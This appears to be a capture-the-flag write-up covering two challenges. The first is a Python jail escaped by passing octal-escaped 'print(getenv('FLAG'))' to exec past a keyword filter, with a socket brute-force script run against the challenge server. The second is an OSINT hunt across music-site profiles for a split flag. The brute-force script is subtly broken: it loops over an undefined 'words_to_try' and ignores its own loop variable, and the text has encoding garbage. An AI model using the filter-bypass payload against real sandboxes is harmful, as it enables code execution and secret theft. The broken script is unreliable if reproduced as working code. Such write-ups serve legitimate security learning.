## Case sensitivity:

### Description

This was a multi-stage challenge that started as a restricted shell and escalated into an incredibly difficult python jail. The jail used a whitelist based filter that blocked nearly every useful function, keyword, and even iterator variables. The final solution was to use the whitelisted `exec` function with a payload where forbidden keywords like `print` and `getenv` were obfuscated using octal escape codes.

### Writeup
We wrote a brute-force script that discovered the whitelist: `PRINT`, `ENVIRON`, `FLAG`, and `exec`. We naturally assumed the solution was `PRINT(ENVIRON['FLAG'])`. However, this produced a NameError. The whitelisted words were a deliberate misdirectionâ€”they passed the filter but were useless at runtime.

Brute force script:

```python
import socket
import string
import keyword
import os

# --- Configuration ---
HOST = 'chall_citadel.cryptonitemit.in'
PORT = 32770
TIMEOUT = 3 

candidates = set()
for k in keyword.kwlist:
    candidates.add(k)
for b in dir(__builtins__):
    candidates.add(b)
for o in dir(os):
    candidates.add(o)
for p in string.printable:
    if not p.isspace():
        candidates.add(p)
wordlist = sorted(list(candidates))
found_words = []
total_words = len(wordlist)

print(f"[*] Starting comprehensive brute-force with {total_words} candidates...")

for i, word in enumerate(wordlist):
    # print progress every 100 words
    if (i + 1) % 100 == 0:
        print(f"[*] Testing... ({i + 1}/{total_words})")
    
    for attempt in words_to_try:
        if attempt in found_words:
            continue
            
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(TIMEOUT)
                s.connect((HOST, PORT))
                s.recv(4096)  # Read banner
                
                payload = attempt + '\n'
                s.sendall(payload.encode())
                
                response = s.recv(4096).decode(errors='ignore')
                
                if "not allowed!" not in response:
                    if attempt not in found_words:
                        print(f"[+] Found whitelisted word: {attempt}")
                        found_words.append(attempt)

        except socket.timeout:
            pass # Ignore timeouts, just means the server is slow
        except Exception:
            pass # Ignore other connection errors

print("\n[*] --- Scan Complete ---")
if found_words:
    print(f"[*] Whitelisted words found: {', '.join(sorted(found_words))}")
else:
    print("[*] No whitelisted words found from the comprehensive list.")
```


The vulnerability was a classic keyword filter bypass. The `clean()` function scanned the string argument passed to `exec` for forbidden words. The solution was to build the payload using characters the filter wouldn't recognize, but that the Python interpreter would correctly parse. We used octal escape codes to construct the payload `print(getenv('FLAG'))`.

    \160\162\151\156\164  ->  `print`

    \147\145\164\145\156\166  ->  `getenv`

    \106\114\101\107      ->  `FLAG`

final command: `exec('\160\162\151\156\164(\147\145\164\145\156\166(\'\106\114\101\107\'))')`

## The Sound of Music:

### Description

ðŸ—¼OSINT pt2: citadweller had a newfound interest in tracking the music they last listened to and posting ratings of new albums on various online platforms.
The flag is hidden in these digital footprints across music platforms and split into three segments. You will need to find all three to uncover the complete code and move on to the next floor.

### Writeup

A well known music tracking website is Last.fm. Searching for "citadweller" on Last.fm leads to the profile: https://www.last.fm/user/citadweller.
There we found the first part of the flag.
Next we ventured to rateyourmusic.com, a popular music rating site. Searching for "citadweller" there led us to the profile: https://rateyourmusic.com/~citadweller.
There we found the second part of the flag.
It also had a link to citadweller's spotify profile. There it had a public playlist with the third part of the flag in the description.

FLAG: `citadel{c0mputers_st0pped_exchang1ng_1nf0rmat10n_n_started_shar1ng_st0r1es_n_then_they_were_n0where_t0_be_f0und}`
